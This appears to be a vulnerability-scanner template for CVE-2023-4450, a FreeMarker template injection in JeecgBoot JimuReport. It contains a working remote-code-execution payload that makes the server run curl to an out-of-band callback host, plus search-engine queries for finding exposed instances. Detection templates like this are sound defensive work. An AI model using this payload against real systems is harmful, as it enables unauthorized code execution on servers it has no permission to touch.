http:
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")
    - status_code == 200
    - contains(content_type,"application/json")
    - contains(body,"success")
    type: dsl
  raw:
  - "POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"sql\": \"<#assign ex=\\\"freemarker.template.utility.Execute\\\
    \"?new()>${ex(\\\"curl http://{{interactsh-url}}\\\")} \",\n  \"type\": \"0\"\n\
    }\n"
id: CVE-2023-4450
info:
  author: Sumanth Vankineni
  classification:
    epss-percentile: 0.99568
    epss-score: 0.90234
  description: 'A vulnerability was found in jeecgboot JimuReport up to 1.6.0. It
    has been declared as critical. Affected by this vulnerability is an unknown functionality
    of the component Template Handler. The manipulation leads to injection. The attack
    can be launched remotely. The exploit has been disclosed to the public and may
    be used.

    '
  impact: 'Unauthorized api called /jmreport/queryFieldBySql led to remote arbitrary
    code execution due to parsing SQL statements using Freemarker.

    '
  metadata:
    fofa-query:
    - "title=\"JeecgBoot \u4F01\u4E1A\u7EA7\u4F4E\u4EE3\u7801\u5E73\u53F0\""
    - title="jeecg-boot"
    - "title=\"jeecgboot \u4F01\u4E1A\u7EA7\u4F4E\u4EE3\u7801\u5E73\u53F0\""
    google-query: intitle:"jeecg-boot"
    max-request: 1
    product: jeecg
    shodan-query:
    - title:"Jeecg-Boot"
    - http.title:"jeecg-boot"
    vendor: jeecg
    verified: true
  name: JeecgBoot JimuReport - Template injection
  reference:
  - https://github.com/advisories/GHSA-j8h5-8rrr-m6j9
  - https://whoopsunix.com/docs/java/named%20module/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-4450
  remediation: 'Upgrading to version 1.6.1 is able to address this issue. It is recommended
    to upgrade the affected component.

    '
  severity: critical
  tags: cve,cve2023,rce,jeecgboot,vkev,vuln
